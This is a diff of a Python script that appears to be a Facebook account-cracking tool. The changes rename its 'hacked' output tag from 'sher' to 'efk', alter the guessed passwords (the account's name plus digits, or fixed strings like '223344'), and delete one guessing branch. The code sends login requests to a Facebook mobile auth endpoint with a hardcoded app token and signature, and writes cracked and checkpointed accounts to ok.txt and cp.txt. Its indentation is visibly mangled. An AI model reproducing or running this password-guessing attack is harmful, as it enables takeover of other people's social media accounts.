@@ -642,7 +642,7 @@ def menu_select():
 
 		                        if 'access_token' in d:
 
-		                            print(" \x1b[1;96m[sher-hacked] "+uid+" | "+pass3+"\x1b[1;0m")
+		                            print(" \x1b[1;96m[efk-hacked] "+uid+" | "+pass3+"\x1b[1;0m")
 
 		                            ok=open("ok.txt","a")
 
@@ -654,7 +654,7 @@ def menu_select():
 
 		                        else:
 
-		                            pass4=name+"2020"
+		                            pass4=name+"18"
 
 		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
@@ -676,7 +676,7 @@ def menu_select():
 
 		                                if 'access_token' in d:
 
-		                                    print("\x1b[1;96m[sher-hacked] "+uid+" | "+pass4+"\x1b[1;0m")
+		                                    print("\x1b[1;96m[efk-hacked] "+uid+" | "+pass4+"\x1b[1;0m")
 
 		                                    ok=open("ok.txt","a")
 
@@ -688,7 +688,7 @@ def menu_select():
 
 		                                else:
 
-		                                    pass5="334455"
+		                                    pass5="223344"
 
 		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
@@ -722,7 +722,7 @@ def menu_select():
 
 		                                        else:
 
-		                                            pass6=name+"223344"
+		                                            pass6=name+"5555"
 
 		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
@@ -788,39 +788,7 @@ def menu_select():
 
 		                                                            oks.append(uid)
 		
-		                                                         else:
-
-		                            pass8=name+"5555"
-
-		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass8 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
-
-		                            d=json.loads(q)
-
-		                            if 'www.facebook.com' in d['error_msg']:
-
-		                                print("[EFK-cp] "+uid+" | "+pass8)
-
-		                                cp=open("cp.txt","a")
-
-		                                cp.write(uid+" | "+pass8+"\n")
-
-		                                cp.close()
-
-		                                cps.append(uid)
-
-		                            else:
-
-		                                if 'access_token' in d:
-
-		                                    print("\x1b[1;96m[efk-hacked] "+uid+" | "+pass8+"\x1b[1;0m")
-
-		                                    ok=open("ok.txt","a")
-
-		                                    ok.write(uid+" | "+pass8+"\n")
-
-		                                    ok.close()
-
-		                                    oks.append(uid)
+	
 		
 									
 
